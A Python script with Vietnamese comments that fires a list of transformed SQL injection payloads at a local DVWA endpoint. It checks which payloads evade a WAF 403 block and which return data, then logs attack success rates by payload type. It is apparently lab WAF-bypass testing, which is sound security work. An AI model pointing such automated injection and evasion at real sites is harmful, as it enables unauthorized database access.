import pandas as pd
import requests
import logging
from collections import Counter
import re

# Cấu hình logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('log.txt'),  # Lưu log vào log.txt
        logging.StreamHandler()  # In log ra màn hình
    ]
)

# Hàm phân loại payload
def classify_payload(payload):
    """Phân loại payload dựa trên cấu trúc chính."""
    if 'or' in payload.lower() and ('1=1' in payload or 'true' in payload):
        return 'Basic OR (1=1 or true)'
    elif 'like' in payload.lower():
        return 'LIKE-based'
    elif 'select' in payload.lower():
        return 'SELECT-based'
    elif 'not' in payload.lower() or '~false' in payload:
        return 'NOT-based'
    else:
        return 'Other'

# Đọc payload
df = pd.read_csv('transformed_sql_mod.csv')
payloads = df['transformed_payload'].tolist()
url = 'http://localhost/vulnerabilities/sqli/?id='
headers = {'Cookie': 'security=low; PHPSESSID=m3sjrh62gdbp5ls9d86hoc3hfv'}
results = []
bypass_count = 0
payload_types = Counter()

# Kiểm tra payload
for payload in payloads:
    try:
        response = requests.get(url + payload + '&Submit=Submit', headers=headers)  # Sửa POST thành GET
        status = 'Blocked (403)' if response.status_code == 403 else 'Not Blocked'
        exploit_success = 'First name' in response.text or 'admin' in response.text.lower()
        payload_type = classify_payload(payload)
        
        if status == 'Not Blocked':
            bypass_count += 1
            payload_types[payload_type] += 1
        
        results.append({
            'Payload': payload,
            'Status': status,
            'Exploit Success': 'Yes' if exploit_success else 'No',
            'Payload Type': payload_type,
            'Response': response.text[:200]
        })
        
        logging.info(f"Payload: {payload}")
        logging.info(f"Status: {status}")
        logging.info(f"Exploit Success: {'Yes' if exploit_success else 'No'}")
        logging.info(f"Payload Type: {payload_type}")
        logging.info("-" * 50)
    except Exception as e:
        results.append({
            'Payload': payload,
            'Status': f'Error: {e}',
            'Exploit Success': 'No',
            'Payload Type': classify_payload(payload),
            'Response': ''
        })
        logging.error(f"Error with payload {payload}: {e}")
        logging.info("-" * 50)

# Tính toán thống kê
total_payloads = len(payloads)
success_rate = (bypass_count / total_payloads) * 100 if total_payloads > 0 else 0
most_effective_type = payload_types.most_common(1)[0] if payload_types else ('None', 0)

# Ghi thống kê vào log
logging.info("=== Attack Summary ===")
logging.info(f"Total Payloads: {total_payloads}")
logging.info(f"Payloads Bypassed: {bypass_count}")
logging.info(f"Success Rate: {success_rate:.2f}%")
logging.info(f"Most Effective Payload Type: {most_effective_type[0]} ({most_effective_type[1]} bypasses)")
logging.info("================")

# Lưu kết quả
df_results = pd.DataFrame(results)
df_results.to_csv('attack_results.csv', index=False)

# Lưu thống kê vào file riêng
with open('attack_summary.txt', 'w') as f:
    f.write(f"Total Payloads: {total_payloads}\n")
    f.write(f"Payloads Bypassed: {bypass_count}\n")
    f.write(f"Success Rate: {success_rate:.2f}%\n")
    f.write(f"Most Effective Payload Type: {most_effective_type[0]} ({most_effective_type[1]} bypasses)\n")